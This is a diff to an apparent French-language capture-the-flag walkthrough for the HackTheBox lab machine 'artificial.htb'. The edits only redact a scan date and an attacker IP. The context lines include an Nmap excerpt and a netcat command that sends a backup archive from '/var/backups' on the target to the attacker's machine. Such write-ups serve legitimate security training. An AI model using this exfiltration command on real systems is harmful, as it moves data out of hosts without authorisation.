@@ -229,7 +229,7 @@ HOP RTT      ADDRESS
 2   6.72 ms  artificial.htb (10.129.x.x)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sat Apr 25 10:06:27 2026 -- 1 IP address (1 host up) scanned in 14.80 seconds
+# Nmap done at [date] -- 1 IP address (1 host up) scanned in 14.80 seconds
 
 ```
 
@@ -1146,7 +1146,7 @@ Sur la machine cible, tu envoies le fichier :
 
 ```bash
 cd /var/backups
-nc 10.10.16.93 4444 < backrest_backup.tar.gz
+nc 10.10.x.x 4444 < backrest_backup.tar.gz
 ```
 
 Le fichier est alors transféré directement vers ta machine Kali.
